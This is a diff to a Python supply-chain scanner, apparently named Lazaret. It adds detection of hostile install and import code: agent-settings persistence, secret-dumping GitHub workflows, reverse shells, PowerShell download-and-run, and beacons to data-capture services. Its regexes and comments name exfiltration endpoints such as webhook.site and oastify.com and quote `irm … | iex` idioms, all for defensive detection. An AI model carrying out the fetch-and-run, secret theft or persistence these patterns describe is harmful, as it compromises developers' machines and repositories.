+_PERSIST_RUNNER_RE = re.compile(_PERSIST_RUNNER_SRC)
+_PERSIST_RUNNER_CONFIG_RE = re.compile(_PERSIST_RUNNER_CONFIG_SRC)
+_PERSIST_RUNNER_ARG_RE = re.compile(_PERSIST_RUNNER_ARG_SRC)
+_BUN_RELEASES_RE = re.compile(_BUN_RELEASES_SRC, re.I)
+_SECRETS_DUMP_RE = re.compile(_SECRETS_DUMP_SRC, re.I)
+#: Lines naming a persistence target examined for a shell write, per target
+_PERSIST_MAX_LINES = 100
+
+
+def _persist_agent_file(text):
+    """The first AI-agent or editor settings file `text` names ('/'-separated:
+    '.claude/settings.json'), whole or as a path join's two literals, or None."""
+    m = _PERSIST_AGENT_RE.search(text)
+    found = (m.start(), m.group().replace("\\", "/")) if m else None
+    for k, s in enumerate(_PERSIST_AGENT_SPLIT_RE.finditer(text)):
+        if k >= _PERSIST_MAX_LINES or (found is not None and s.start() > found[0]):
+            break
+        if s.group(2) in _PERSIST_AGENT_PAIRS[s.group(1)]:
+            found = (s.start(), f".{s.group(1)}/{s.group(2)}.json")
+            break
+    return None if found is None else found[1]
+
+
+def _shell_writes(text, target_re):
+    """Is there a shell write (a redirection, tee, cp …) on a line on which
+    target_re matches? Each line is searched once, and at most
+    _PERSIST_MAX_LINES lines."""
+    m, lines = target_re.search(text), 0
+    while m is not None and lines < _PERSIST_MAX_LINES:
+        start = text.rfind("\n", 0, m.start()) + 1
+        end = text.find("\n", m.end())
+        end = len(text) if end < 0 else end
+        if _PERSIST_SHELL_WRITE_RE.search(text, start, end):
+            return True
+        lines += 1
+        m = target_re.search(text, end)
+    return False
+
+
+def _after_on_line(text, first_re, then_re):
+    """Is there a line on which first_re matches and then_re matches after it?
+    Each line is read once: its first first_re match, then then_re after it."""
+    m = first_re.search(text)
+    while m is not None:
+        end = text.find("\n", m.end())
+        end = len(text) if end < 0 else end
+        if then_re.search(text, m.end(), end) is not None:
+            return True
+        m = first_re.search(text, end)
+    return False
+
+
+def _writes_named(text, target_re):
+    """Does `text` name a target (target_re) and write it?"""
+    return target_re.search(text) is not None and (
+        _PERSIST_WRITE_RE.search(text) is not None or _shell_writes(text, target_re))
+
+
+def dumps_workflow_secrets(text):
+    """Does `text` carry a GitHub Actions workflow that hands every repository
+    secret to a job (`${{ toJSON(secrets) }}`) and name the workflows
+    directory? The Shai-Hulud worms planted such workflows."""
+    return _SECRETS_DUMP_RE.search(text) is not None and _PERSIST_WORKFLOW_RE.search(text) is not None
+
+
+def persistence_reasons(text):
+    """The persistence-target reasons of the install-script test (see above):
+    what `text` makes an AI agent, an editor or GitHub Actions run later, and
+    the Bun loader the Shai-Hulud worms fetch their payload's runtime with."""
+    reasons = []
+    agent = _persist_agent_file(text)
+    if agent is not None and (_PERSIST_WRITE_RE.search(text) is not None or _shell_writes(
+            text, _PERSIST_AGENT_RE) or _shell_writes(text, _PERSIST_AGENT_SPLIT_RE)):
+        reasons.append(f"writes an AI agent's or editor's auto-run settings ({agent})")
+    if dumps_workflow_secrets(text):
+        reasons.append("carries a GitHub Actions workflow that dumps every repository secret")
+    elif _PERSIST_WORKFLOW_RE.search(text) is not None and (
+            _writes_named(text, _PERSIST_WORKFLOW_RE) or "/contents/" in text):
+        reasons.append("writes a GitHub Actions workflow")
+    install = _PERSIST_EXT_INSTALL_RE.search(text) is not None
+    if ((install and (_EXEC_CALL_RE.search(text) is not None
+                      or _after_on_line(text, _PERSIST_EXT_CLI_RE, _PERSIST_EXT_INSTALL_RE)))
+            or _writes_named(text, _PERSIST_EXT_DIR_RE)):
+        reasons.append("installs an editor extension")
+    if _PERSIST_RUNNER_RE.search(text) is not None or _after_on_line(
+            text, _PERSIST_RUNNER_CONFIG_RE, _PERSIST_RUNNER_ARG_RE):
+        reasons.append("registers the machine as a GitHub Actions self-hosted runner")
+    if _BUN_RELEASES_RE.search(text) is not None and _EXEC_CALL_RE.search(text) is not None:
+        reasons.append("downloads the Bun runtime from GitHub and runs code with it")
+    return reasons
+
+
 def install_script_risk(text):
     """Reasons an install-time script looks hostile ([] if none)."""
     reasons = []
@@ -4790,6 +6478,16 @@ def install_script_risk(text):
         reasons.append(_DL_CATEGORY_REASON["run"])
     elif received is not None:
         reasons.append(_DL_CATEGORY_REASON[received[1]])
+    reasons.extend(powershell_risk(text))
+    if (received is None or received[1] != "run") and not substituted and stager_at(text) >= 0:
+        reasons.append("carries a script that downloads and runs code")
+    if reverse_shell_at(text) >= 0:
+        reasons.append("opens a reverse shell")
+    if sends_host_info(text):
+        reasons.append("sends the machine's user or host name over the network")
+    if runs_own_source_at(text) >= 0:
+        reasons.append("runs code it reads back from its own file or a data file shipped with it")
+    reasons.extend(persistence_reasons(text))
     return reasons
 
 
@@ -4826,16 +6524,180 @@ _EXEC_CALL_RE = re.compile(
 _IMPORT_HARVEST_NEEDLES = ("process.env", "os.environ", "id_", ".git-credentials", "leveldb")
 
 
-def import_time_risk(text):
+# Import-time code that is SUSPICIOUS on its own (audit P0, 0.1.7): the
+# test above stays MAJOR for what ordinary code can share (a download written
+# to a file and run is a prebuilt-binary installer's shape; whole-environment
+# reads meet network code in SDKs), but these reasons are CRITICAL wherever
+# they are found — fetch-and-run and the other shapes install_script_risk
+# names that no library needs: code received over the network and run, a
+# download run through a shell, PowerShell that hides or fetches what it
+# runs, a stager string, a reverse shell, credentials or the environment
+# sent to a named exfiltration service, the machine's user or host name sent
+# to a data-capture service (the dependency-confusion beacon), a download
+# run with the Python interpreter (a script, not a binary), and a GitHub
+# Actions workflow that dumps every repository secret (see persistence targets).
+_STRONG_IMPORT_REASONS = (
+    "runs code it receives over the network", "runs a downloaded script through a shell",
+    "runs an encoded PowerShell command", "runs PowerShell that", "carries a script that downloads and runs code",
+    "opens a reverse shell", "reads credentials or the whole environment and sends them to",
+    "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with Python",
+    "runs code it reads back from its own file", "carries a GitHub Actions workflow that dumps every repository secret")
+# Endpoints that exist to capture what is sent to them (out-of-band testing,
+# request inspection): no library reports to one
+_CAPTURE_SERVICE_RE = re.compile(
+    r"webhook\.site|typedwebhook\.tools|oastify\.com|burpcollaborator|\binteract\.sh|\boast[\w.-]*\.(?:pro|live|site"
+    r"|online|fun|me|com)\b|pipedream\.net|requestbin|requestcatcher\.com|hookbin\.com|postb\.in|beeceptor\.com"
+    r"|dnslog\.cn|ceye\.io|canarytokens", re.I)
+_PY_RUN_RE = re.compile(
+    r"""\[\s*(?:sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
+    r"""|\b(?:system|popen|getoutput|run|call|Popen)\s*\(\s*f?["']python[\d.w]*(?:\.exe)?\s""")
+
+# Prose is not import-time code (0.1.7). On the audit's benign PyPI corpus a
+# CLI's docstring showed `powershell -c "irm … | iex"` and a comment quoted
+# `iwr … | iex` (huggingface-hub), and a docstring named ``id_rsa``
+# (paramiko). A Python or JavaScript file that fails the test is read again
+# with its comments blanked and, in Python, the string literals that stand
+# alone as statements (docstrings, strings used as block comments) — not in
+# a file that reads its own source (open(__file__), __doc__ … see
+# _SELF_READ_RE): a comment can hold what it runs, or its C2 address. The text
+# keeps its line breaks and one character per character, so lines and the
+# patterns' bounds are the file's. PowerShell counts at import time only as
+# an argument of an exec call (`os.system('powershell …')`,
+# `subprocess.run(["pwsh", …])`, over lines): a CLI's self-update code
+# builds the command in one function and runs it in another, and its help
+# text shows one. Both are the test's rule for a download piped into a shell.
+_PY_DOC_HEAD_RE = re.compile(r"[ \t]*[rRuUbB]{0,2}\Z")   # what may precede a statement string on its line
+_PY_JOINS = "([{,=+-*/%&|^<>~@\\.\"'"   # code a string on the next line continues (or joins, as a literal)
+_BRACKET_RE = re.compile(r"[()\[\]{}]")
+_SPACE_TAB_RE = re.compile(r"[ \t]*")
+_PS_EXEC_BACK = 300              # characters before a PowerShell name searched for the exec call it is in
+_PS_EXEC_MAX_NAMES = 200         # PowerShell names examined per text
+
+
+def _py_statement_literals(text, literals, comments):
+    """The spans of `literals` (the lexer's) that stand alone as statements:
+    a string, not an f-string, that begins its line outside brackets, after
+    code that does not continue into it (a backslash, an operator, an open
+    bracket, a comma or another string), with nothing but a comment after it
+    on its line. One pass: each character is read a bounded number of times,
+    however long its line."""
+    out = []
+    marks = sorted([(s, e, True) for s, e in literals] + [(s, e, False) for s, e in comments])
+    depth, pos, last = 0, 0, ""        # bracket depth, end of the last mark, last code character
+    for s, e, is_literal in marks:
+        if s < pos:
+            continue
+        k = text.rfind("\n", pos, s)
+        ls = k + 1 if k >= 0 else (0 if pos == 0 else -1)     # -1: a mark before it on its line
+        prior = last                   # the last code character before the literal's line
+        if ls > pos:
+            code = text[pos:ls].rstrip()
+            if code:
+                prior = code[-1]
+        gap = text[pos:s]
+        for b in _BRACKET_RE.finditer(gap):
+            depth = depth + 1 if b.group() in "([{" else max(0, depth - 1)
+        code = gap.rstrip()
+        if code:
+            last = code[-1]
+        pos = e
+        if not is_literal:
+            continue
+        if e > s:
+            last = text[e - 1]
+        j = _SPACE_TAB_RE.match(text, e).end()
+        if (ls >= 0 and depth == 0 and (not prior or prior not in _PY_JOINS) and _PY_DOC_HEAD_RE.match(text, ls, s)
+                and not (ls >= 2 and text[ls - 2] == "\\") and (j == len(text) or text[j] in "\n#")):
+            out.append((s, e))
+    return out
+
+
+def _blank(text, spans):
+    """`text` with the characters of `spans` (sorted, disjoint) made spaces,
+    its line breaks kept."""
+    if not spans:
+        return text
+    parts, p = [], 0
+    for s, e in spans:
+        s = max(s, p)
+        if e <= s:
+            continue
+        parts.append(text[p:s])
+        parts.append("\n".join(" " * len(row) for row in text[s:e].split("\n")))
+        p = e
+    parts.append(text[p:])
+    return "".join(parts)
+
+
+def _import_code(text, lang):
+    """`text` (a Python or JavaScript file) with its prose blanked (see
+    above) — unchanged when it reads its own source: then its comments and
+    docstrings may be what it runs or where it keeps an address."""
+    if reads_own_source(text):
+        return text
+    literals = [] if lang == "py" else None
+    comments = _lex_comment_spans(text, lang, literals=literals)
+    spans = list(comments)
+    if literals:
+        spans = sorted(spans + _py_statement_literals(text, literals, comments))
+    return _blank(text, spans)
+
+
+def _call_open(rest):
+    """Is a call whose '(' comes just before `rest` still open at its end?"""
+    depth = 1
+    for b in _BRACKET_RE.finditer(rest):
+        depth += 1 if b.group() in "([{" else -1
+        if depth == 0:
+            return False
+    return True
+
+
+def _powershell_run_at(text):
+    """The offset of the first PowerShell name of `text` that is an argument
+    of an exec call opened at most _PS_EXEC_BACK characters before it, else
+    -1 (at most _PS_EXEC_MAX_NAMES names are examined)."""
+    for k, m in enumerate(_PS_RE.finditer(text)):
+        if k >= _PS_EXEC_MAX_NAMES:
+            break
+        window = text[max(0, m.start() - _PS_EXEC_BACK):m.start()]
+        if any(_call_open(window[c.end():]) for c in _EXEC_CALL_RE.finditer(window)):
+            return m.start()
+    return -1
+
+
+def import_time_severity(reasons):
+    """'CRITICAL' when one of `reasons` (import_time_risk's) is a strong one
+    (see _STRONG_IMPORT_REASONS), else 'MAJOR'."""
+    return "CRITICAL" if any(r.startswith(_STRONG_IMPORT_REASONS) for r in reasons) else "MAJOR"
+
+
+def import_time_risk(text, lang=None):
     """-> (reasons, line): why code that runs on import looks hostile by
     the weaker test above ([] if not), and the 1-based line of the first
-    sign. `text` has \\n line endings."""
+    sign. `text` has \\n line endings; `lang` 'py' or 'js' reads it without
+    its prose (see _import_code). import_time_severity grades them."""
+    reasons, line = _import_time_risk(text)
+    if reasons and lang in ("py", "js"):
+        code = _import_code(text, lang)
+        if code != text:
+            reasons, line = _import_time_risk(code)
+    return reasons, line
+
+
+def _import_time_risk(text):
     reasons, line = [], None
     harvest = (_IMPORT_HARVEST_RE.search(text)
                if any(needle in text for needle in _IMPORT_HARVEST_NEEDLES) else None)
-    if harvest and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)):
-        reasons.append("reads credentials or the whole environment and sends data over the network")
-        line = text.count("\n", 0, harvest.start()) + 1
+    if harvest:
+        service = _EXFIL_SERVICE_RE.search(text)
+        if service:
+            reasons.append("reads credentials or the whole environment and sends them to "
+                           f"an exfiltration service ({service.group(0)[:40]})")
+        elif _NETWORK_RE.search(text):
+            reasons.append("reads credentials or the whole environment and sends data over the network")
+        if reasons:
+            line = text.count("\n", 0, harvest.start()) + 1
     if "curl" in text or "wget" in text:
         for i, row in enumerate(text.split("\n")):
             if _runs_download_through_shell(row):
@@ -4848,8 +6710,37 @@ def import_time_risk(text):
         line = line or received[0]
     dropped = _downloads_and_runs_file(text)
     if dropped is not None:
-        reasons.append("downloads a file and then runs it")
+        reasons.append("downloads a script and runs it with Python" if _PY_RUN_RE.search(text)
+                       else "downloads a file and then runs it")
         line = line or dropped
+    signs = []                        # (offset, reason) of the shapes no library needs
+    ps = powershell_risk(text)
+    if ps:
+        at = _powershell_run_at(text)
+        if at >= 0:
+            signs.append((at, ps[0]))
+    if received is None or received[1] != "run":
+        at = stager_at(text)
+        if at >= 0:
+            signs.append((at, "carries a script that downloads and runs code"))
+    at = reverse_shell_at(text)
+    if at >= 0:
+        signs.append((at, "opens a reverse shell"))
+    host = _HOST_INFO_RE.search(text)
+    if host:
+        capture = _CAPTURE_SERVICE_RE.search(text)
+        if capture:
+            signs.append((host.start(), "sends the machine's user or host name to a data-capture service "
+                                        f"({capture.group(0)[:40]})"))
+    at = runs_own_source_at(text)
+    if at >= 0:
+        signs.append((at, "runs code it reads back from its own file or a data file shipped with it"))
+    if dumps_workflow_secrets(text):
+        signs.append((_SECRETS_DUMP_RE.search(text).start(),
+                      "carries a GitHub Actions workflow that dumps every repository secret"))
+    for at, reason in signs:
+        reasons.append(reason)
+        line = line or text.count("\n", 0, at) + 1
     return reasons, line
 
 
@@ -5825,7 +7716,8 @@ def _dl_region_names_path(region, path):
 
 def _downloads_and_runs_file(text):
     """The 1-based line where a received value is written to a file that is then
-    run (see the section comment), else None. MAJOR only."""
+    run (see the section comment), else None. MAJOR only, except in the Python
+    code pip runs to install an sdist (the registry)."""
     if (not any(n in text for n in _DL_NEEDLES) or not any(n in text for n in _DL_FILE_WRITE_NEEDLES)
             or not any(n in text for n in _DL_PATHRUN_NEEDLES)):
         return None
@@ -6568,6 +8460,17 @@ def unreadable_issue(path, reason):
         "Scan coverage")
 
 
+def config_skipped_issue(path, detail):
+    """Q-SKIPPED-CONFIG: a config or data file too large to check for credentials."""
+    return _coverage_issue(
+        "Q-SKIPPED-CONFIG", "Config file not checked (too large)", path,
+        f"{path} was not checked for credentials: {_safe_text(detail)}.",
+        "Config and data files are read only to look for credentials, and one this large is "
+        "data rather than configuration: a credential in it would not be reported.",
+        "Keep credentials out of large data files, and real configuration in files of its own.",
+        "Scan coverage")
+
+
 def scan_error_issue(path, exc):
     """SC-TRUNCATED for a file (or directory) whose scan raised: the run goes
     on without its findings, and like any file not fully scanned it fails the
@@ -7025,6 +8928,9 @@ def _collect_file(path, rel, st, in_dep, col):
             bi = classify_binary(disp, head, size, "repo")
             if bi:
                 issues.append(bi)
+            elif not in_dep and configsecrets.is_config_file(name) and (
+                    head.startswith((b"\xff\xfe", b"\xfe\xff")) or not looks_binary(head)):
+                _collect_config(path, disp, size, col)          # text (UTF-16 with its BOM too)
             return
     if lang is not None and ext in MPEG_TS_EXTS:
         head = _read_prefix(path, HEADER_SAMPLE_BYTES)
@@ -7063,17 +8969,38 @@ def _collect_file(path, rel, st, in_dep, col):
     col["files"].append({"path": disp, "content": text, "lang": lang, "dep": in_dep})
 
 
+def _collect_config(path, disp, size, col):
+    """Read a config or data file for scan_config_file (see configsecrets):
+    decoded like source but without the encoding notes, since it is not
+    code; over CONFIG_SCAN_CAP a Q-SKIPPED-CONFIG note instead."""
+    cap = configsecrets.CONFIG_SCAN_CAP
+    if size > cap:
+        col["issues"].append(config_skipped_issue(
+            disp, f"{size:,} bytes is over the {cap:,}-byte limit for config files"))
+        return
+    data = _read_prefix(path, cap + 1)
+    if len(data) > cap:                  # grew between the lstat and the read
+        col["issues"].append(config_skipped_issue(
+            disp, f"it grew past the {cap:,}-byte limit for config files while it was read"))
+        return
+    text = decode_source(data)[0]
+    if not configsecrets.own_report(text):          # a report of Lazaret's own is not config
+        col["configs"].append({"path": disp, "content": text})
+
+
 def _collect(root, excludes=(), include_deps=False):
     """Walk `root` iteratively. Returns {"files", "manifests", "pth", "issues",
-    "skipped"}: files = [{path, content, lang, dep}], manifests = [{path,
-    content, dep}], pth = paths of the .pth files checked, issues = collection
-    findings (binary classification, SC-TRUNCATED, Q-ENCODING/SC-UTF7,
-    SC-PYC-*, SC-PTH-EXEC, Q-SYMLINK, Q-UNREADABLE), skipped = [(rel,
-    n_files, n_bytes)] pruned trees. Paths are root-relative
-    (os.sep separators) and valid UTF-8. Raises ScanTargetError when the root
-    itself cannot be listed."""
+    "skipped", "configs"}: files = [{path, content, lang, dep}], manifests =
+    [{path, content, dep}], pth = paths of the .pth files checked, issues =
+    collection findings (binary classification, SC-TRUNCATED,
+    Q-ENCODING/SC-UTF7, SC-PYC-*, SC-PTH-EXEC, Q-SYMLINK, Q-UNREADABLE,
+    Q-SKIPPED-CONFIG), skipped = [(rel, n_files, n_bytes)] pruned trees,
+    configs = [{path, content}] config and data files outside dependency
+    trees (scan_config_file). Paths are root-relative (os.sep separators) and
+    valid UTF-8. Raises ScanTargetError when the root itself cannot be
+    listed."""
     excludes = set(excludes or ())
-    col = {"files": [], "manifests": [], "pth": [], "issues": [], "skipped": []}
+    col = {"files": [], "manifests": [], "pth": [], "issues": [], "skipped": [], "configs": []}
     issues = col["issues"]
     seen_dirs = set()
     stack = [("", False)]
@@ -7507,7 +9434,8 @@ def _xf_issue(path, line, text, cat, srcs):
     msg = (f"Dependency code {_DL_CATEGORY_REASON[cat]}; the value is received in "
            f"another file of the package ({where}).")
     return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT", "sev": "MAJOR",
+        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
+         "sev": import_time_severity([_DL_CATEGORY_REASON[cat]]),
          "msg": msg, "why": _DEP_IMPORT_RISK_WHY,
          "fix": f"Read both files: what does {where} receive, and what runs it here?",
          "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
@@ -7853,7 +9781,7 @@ def dependency_checks(root, files, manifests, issues, excludes=(), should_stop=N
             if stopped:
                 return out, extra, stopped
         try:
-            found = dependency_import_issue(f["path"], f["content"])
+            found = dependency_import_issue(f["path"], f["content"], f["lang"])
             agent = dependency_agent_issue(f["path"], f["content"])
         except Exception as exc:
             found, agent = scan_error_issue(f["path"], exc), None
@@ -7916,6 +9844,11 @@ def _follow_dependency_hook(tree, issue, out, extra, run, followed_to_end):
             mlines = m["content"].split("\n")
             out.append(_agent_hijack_issue(manifest, issue["line"], mlines, direct[0], direct[1],
                                            redactor=_Redactor(mlines)))
+    persist = persistence_reasons(issue["cmd"])            # the command itself plants something
+    if persist and issue["sev"] not in ("BLOCKER", "CRITICAL"):
+        msg = f"Install hook command {'; and '.join(persist)}."
+        issue["sev"] = "CRITICAL"
+        issue["msg"] = _redact_text(msg) if REDACT_SECRETS else msg
     targets, complete = follow_hook(issue["cmd"])
     if not complete and manifest not in followed_to_end:
         followed_to_end[manifest] = True
@@ -7979,15 +9912,17 @@ def _read_dependency_script(tree, rel, as_lang, out, extra):
     return text
 
 
-def dependency_import_issue(path, text):
-    """SC-IMPORT-RISK (MAJOR) for a dependency's JavaScript or Python file
-    that fails the import-time test (import_time_risk), else None."""
-    reasons, line = import_time_risk(text)
+def dependency_import_issue(path, text, lang=None):
+    """SC-IMPORT-RISK (MAJOR, or CRITICAL: import_time_severity) for a
+    dependency's JavaScript or Python file (`lang` 'js' or 'py') that fails
+    the import-time test (import_time_risk), else None."""
+    reasons, line = import_time_risk(text, lang)
     if not reasons:
         return None
     lines = text.split("\n")
     return mk_issue(
-        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT", "sev": "MAJOR",
+        {"id": "SC-IMPORT-RISK", "name": "Risky import-time code", "type": "HOTSPOT",
+         "sev": import_time_severity(reasons),
          "msg": f"Dependency code {'; and '.join(reasons)}.", "why": _DEP_IMPORT_RISK_WHY,
          "fix": "Read the file: what does it collect, and where does it send it?",
          "ref": "CWE-506 · Supply chain"}, path, line, lines, redactor=_Redactor(lines))
@@ -8098,8 +10033,8 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
             warnings.extend(f"taint config: {m}" for m in
                             _dedupe(get_taint_config_warnings() + flow_warnings))
         col = _collect(root, exclude, include_deps=include_deps)
-        files, manifests = col["files"], col["manifests"]
-        if not files and not manifests and not col["pth"] and not col["issues"]:
+        files, manifests, configs = col["files"], col["manifests"], col["configs"]
+        if not files and not manifests and not configs and not col["pth"] and not col["issues"]:
             raise ScanTargetError(
                 f"nothing to scan under {_fs_display(root)}: no Python, JavaScript or "
                 f"SQL sources, package manifests or other files to check")
@@ -8117,6 +10052,18 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
             except Exception as exc:        # one file must never kill the run
                 issues.append(scan_error_issue(f["path"], exc))
             scanned.append(f)
+        checked = 0                         # config and data files: credentials only
+        read = tree_reader(files, configs)  # what an editor's or agent's settings run (SC-AUTORUN)
+        for cf in configs:
+            if not stopped and should_stop is not None:
+                stopped = should_stop()
+            if stopped:
+                break
+            try:
+                issues.extend(scan_config_file(cf["path"], cf["content"], read))
+            except Exception as exc:
+                issues.append(scan_error_issue(cf["path"], exc))
+            checked += 1
         for mf in manifests:
             if not stopped and should_stop is not None:
                 stopped = should_stop()
@@ -8138,8 +10085,9 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
                 issues.append(truncated_issue(
                     ".", f"{stopped}: what the dependencies run was not checked to the end"))
         else:
+            total = len(files) + len(configs)
             issues.append(truncated_issue(
-                ".", f"{stopped}: {len(files) - len(scanned)} of {len(files)} files "
+                ".", f"{stopped}: {total - len(scanned) - checked} of {total} files "
                      f"not scanned"))
             files = scanned
         # G10: skipped-directory accounting — INFO findings make the coverage
@@ -8160,6 +10108,7 @@ def scan_project(root, exclude=(), include_deps=False, taint_config=None,
         # them (and every scan_file finding) the file's own redaction
         redact_file_issues(numbered, files)
         res = build_result(root, files, issues)
+        res["metrics"]["configFiles"] = checked
         res["warnings"] = warnings
         if stopped:
             res.update(incomplete=True, incompleteReason=stopped)
@@ -8215,10 +10164,10 @@ def worst_sev_rating(issues, types):
 #: the scanner could not look at, not the code: they do not count toward the
 #: maintainability rating (a single symlink in a small project used to be
 #: enough to fail "Maintainability >= C").
-COVERAGE_RULES = frozenset({"Q-SKIPPED-TREE", "Q-SYMLINK", "Q-UNREADABLE",
-                            # analysis-coverage notes from the flow engine and the
-                            # taint-config loader (Python-only; the npm engine has
-                            # neither)
+COVERAGE_RULES = frozenset({"Q-SKIPPED-TREE", "Q-SYMLINK", "Q-UNREADABLE", "Q-SKIPPED-CONFIG",
+                            # analysis-coverage notes from the flow engine (the
+                            # npm engine's JavaScript pass writes the Q-FLOW
+                            # notes too) and the taint-config loader (Python's)
                             "Q-FLOW-SKIPPED", "Q-FLOW-INCOMPLETE", "Q-FLOW-RECURSION",
                             "Q-TAINT-CONFIG"})
 
@@ -8486,7 +10435,8 @@ def print_report(res, quiet):
     m, ct, rt = res["metrics"], res["counts"], res["ratings"]
     print()
     print(c("1", f"Lazaret scan — {sanitize_term_line(res['project'])}"))
-    print(f"  {m['files']} files · {m['ncloc']} lines of code · {m['dupPct']}% duplication")
+    configs = f" · {m['configFiles']} config files" if m.get("configFiles") else ""
+    print(f"  {m['files']} files · {m['ncloc']} lines of code · {m['dupPct']}% duplication{configs}")
     print()
     gate = c("42;30", " PASSED ") if res["pass"] else c("41;97", " FAILED ")
     print(f"  Quality gate: {gate}")
